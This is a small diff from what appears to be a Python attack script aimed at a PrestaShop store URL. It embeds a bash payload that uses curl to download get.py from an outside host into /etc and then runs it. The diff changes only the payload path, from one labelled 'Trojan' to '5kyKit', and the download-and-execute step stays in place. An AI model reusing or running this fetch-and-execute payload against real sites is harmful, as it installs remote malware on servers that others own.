@@ -2,7 +2,7 @@ import requests
 
 script = """
 #!/bin/bash
-curl -o /etc/get.py https://files.ravenn.net/horror/Trojan/get.py
+curl -o /etc/get.py https://files.ravenn.net/horror/5kyKit/get.py
 python3 get.py
 """
 url = 'https://shop.allsafe.com/prestashop'
